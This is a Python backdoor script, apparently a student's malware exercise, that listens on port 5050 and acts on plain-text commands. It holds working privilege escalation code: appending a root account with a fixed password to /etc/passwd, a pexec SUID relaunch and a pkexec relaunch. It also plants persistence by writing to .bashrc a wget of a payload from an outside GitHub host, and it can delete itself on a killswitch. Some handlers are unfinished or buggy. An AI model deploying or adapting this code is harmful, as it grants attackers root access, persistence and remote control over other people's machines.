#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!


# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time
import os
import cgi


THIS_FILE = os.path.realpath(__file__)
KILLSWITCH_FILE = "killswitch.txt"

def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )


# listen on port 5050, receive input
HOST, PORT = "0.0.0.0", 5050

def is_root():
    return os.geteuid() == 0

def escalate_privileges():
    if not is_root():
        try:
            subprocess.run(["pkexec", sys.executable, THIS_FILE], check=True)
            sys.exit(0)  # Exit the current process, let pkexec restart it
        except subprocess.CalledProcessError:
            print("Privilege escalation failed.")
            sys.exit(1)

def escalate_weak_passwd():
    """
    Privilege Escalation: Weak File Permissions - Writable /etc/passwd
    Modifies /etc/passwd to add a new root user.

    After, run the command: "su newroot"
    and enter "newpasswordhere" when prompted for the password
    """
    new_username = "newroot"
    new_password = "newpasswordhere"

    # Generate a password hash
    hash_cmd = f"openssl passwd {new_password}"
    password_hash = run_command(hash_cmd).stdout.strip()

    new_entry = f"{new_username}:{password_hash}:0:0:root:/root:/bin/bash\n"
    passwd_path = "/etc/passwd"

    try:
        with open(passwd_path, 'a') as passwd_file:
            passwd_file.write(new_entry)
        print(f"Added user {new_username} with root privileges.")
    except PermissionError:
        print("Failed to modify /etc/passwd. Insufficient permissions.")
    except Exception as e:
        print(f"Unexpected error: {e}")

def escalate_suid_pexec():
    """
    Privilege Escalation: SUID on pexec
    Executes a root shell using SUID-enabled pexec.
    """
    try:
        #result = run_command('/path/to/pexec /bin/bash')
        
        print("SUID exploit")
        #result = run_command('pexec /bin/sh -p -c "python ' + THIS_FILE + '"')
        subprocess.Popen(['pexec', 'python' , THIS_FILE],start_new_session=True)
        print("SUID exploit using pexec succeeded.")
        
    except Exception as e:
        print(f"SUID pexec escalation failed: {e}")

def handle_rlc(conn, command_length, command):
    """Handle rlc (run linux command) requests."""

    # Trim the command to the specified length
    command = command[:command_length]

    # Run the command and capture the output
    result = run_command(command).stdout
    print(result)

    conn.sendall(result)

    

def kill_others():
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)

def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """
    print(sys.prefix, sys.base_prefix)
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        import requests

def handle_conn(conn, addr):
    with conn:
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        data = conn.recv(1024) 
        print("received: " + data.decode("utf-8", errors="replace").strip())

        if data.decode("utf-8", errors="replace").strip() == "PRIVEXEC":
            print("DOING ESCALATION")
            #subprocess.run(["pkexec", path_to_python, script_path])
            escalate_privileges()
            return
        
        """if data.decode("utf-8", errors="replace").strip().startswith() == "CMD":
         #   parts = data.split(" ", 3)  # Split into three parts
         #   command_length = int(parts[1])
            command = parts[2]
            # Run the command using handle_rlc
            handle_rlc(conn, command_length, command)
            return"""

        if data.decode("utf-8", errors="replace").strip() == "ESCALATE_PASSWD":
            print("DOING Password ESCALATION")
            #subprocess.run(["pkexec", path_to_python, script_path])
            #escalate_privileges()  # Elevate to root
            escalate_weak_passwd()
            return
        
        if data.decode("utf-8", errors="replace").strip() == "ESCALATE_PEXEC":
            print("DOING SUID pexec escalation")
            #subprocess.run(["pkexec", path_to_python, script_path])
            #escalate_privileges() # elevate to root
            escalate_suid_pexec()
            return
        
        if data.decode("utf-8", errors="replace").strip() == "KILLSWITCH":
            print("Killswitch command received. Activating killswitch...")
            conn.sendall("Killswitch activated. Goodbye!".encode())
            activate_killswitch()  # Trigger the killswitch
            conn.close()  # Close the connection
            sys.exit(0)  # Terminate the script
            return

        if data.decode("utf-8", errors="replace").strip() == "HELLO":
            print("'HELLO' command received. Waiting for additional data...")
            conn.sendall("Please enter your data: ".encode())

            # Receive additional data from the terminal (blocking call)
            additional_data = conn.recv(1024).decode("utf-8", errors="replace")
            conn.sendall(additional_data.encode())
            print(f"Sent data: {additional_data}")

        if data.decode("utf-8", errors="replace").strip() == "shellStartup":
            print("aaaaaaaaaa")
            fileBash = open(".bashrc", "a")
            fileBash.write("wget https://raw.githubusercontent.com/sandhe1/server/refs/heads/main/serverFile\n")
            fileBash.write("python serverFile.py\n")
            fileBash.close() 
            conn.sendall("it works".encode())

            return  # End the connection handling after processing


        if not data:
            return
        

        # Think VERY carefully about how you will communicate between the client and server
        # You will need to make a custom protocol to transfer commands

        try:
            conn.sendall("Response data here".encode())
            # Process the communication data from 
        except Exception as e:
            conn.sendall(f"error: {e}".encode())



def main():
    kill_others()
    bootstrap_packages()


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()  # allows for 10 connections
        print(f"Listening on {HOST}:{PORT}")
        while True:
            try:
                conn, addr = s.accept()
                handle_conn(conn, addr)
            except KeyboardInterrupt:
                raise
            except:
                print("Connection died")
    activate_killswitch()

def activate_killswitch():
    """
    Activates the killswitch by creating a file and deleting the script.
    """
    try:
        # Write 'True' to the killswitch file
        with open(KILLSWITCH_FILE, 'w') as f:
            f.write("True")
        print(f"Killswitch activated: {KILLSWITCH_FILE}")

        # Self-delete the script
        os.remove(THIS_FILE)
        print(f"Deleted script: {THIS_FILE}")
    except Exception as e:
        print(f"Error activating killswitch: {e}")

if __name__ == "__main__":
    main()
